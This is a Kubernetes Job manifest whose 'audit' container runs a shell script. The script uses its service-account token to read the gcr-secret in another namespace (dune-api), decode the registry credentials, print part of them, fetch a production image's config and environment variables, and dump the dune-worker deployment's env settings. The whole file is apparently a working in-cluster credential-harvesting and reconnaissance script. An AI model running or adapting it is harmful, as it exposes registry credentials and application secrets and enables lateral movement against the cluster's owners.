apiVersion: batch/v1
kind: Job
metadata:
  name: dune-img-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          
          # Get GCR credentials from gcr-secret in dune-api namespace
          GCR_SECRET=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret")
          DOCKER_CONFIG=$(echo "$GCR_SECRET" | jq -r '.data[".dockerconfigjson"]' | base64 -d)
          echo "Docker config keys: $(echo "$DOCKER_CONFIG" | jq -r '.auths | keys[]')"
          
          # Extract auth for us-central1-docker.pkg.dev
          GCR_AUTH=$(echo "$DOCKER_CONFIG" | jq -r '.auths["us-central1-docker.pkg.dev"].auth // .auths["https://us-central1-docker.pkg.dev"].auth')
          echo "GCR auth (first 20): ${GCR_AUTH:0:20}..."
          
          REGISTRY="us-central1-docker.pkg.dev"
          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
          TAG="v0.0.39-alpha.9"
          
          echo "=GET_MANIFEST="
          MANIFEST=$(curl -s -H "Authorization: Basic $GCR_AUTH" \
            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
          echo "$MANIFEST" | jq '{schemaVersion:.schemaVersion, mediaType:.mediaType, configDigest:.config.digest, layers:.layers | length}'
          
          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
          echo "Config digest: $CONFIG_DIGEST"
          echo "=END_MANIFEST="
          
          echo "=IMAGE_CONFIG="
          curl -s -H "Authorization: Basic $GCR_AUTH" \
            "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | jq '.config | {Env:.Env, Cmd:.Cmd, Entrypoint:.Entrypoint, WorkingDir:.WorkingDir}'
          echo "=END_CONFIG="
          
          # Also get dune-worker image
          WORKER_DEPLOY=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/apps/v1/namespaces/dune-api/deployments/dune-worker")
          WORKER_IMAGE=$(echo "$WORKER_DEPLOY" | jq -r '.spec.template.spec.containers[0].image')
          echo "Worker image: $WORKER_IMAGE"
          echo "Worker env: $(echo "$WORKER_DEPLOY" | jq '.spec.template.spec.containers[0] | {env:.env, envFrom:.envFrom, volumes:.volumeMounts}')"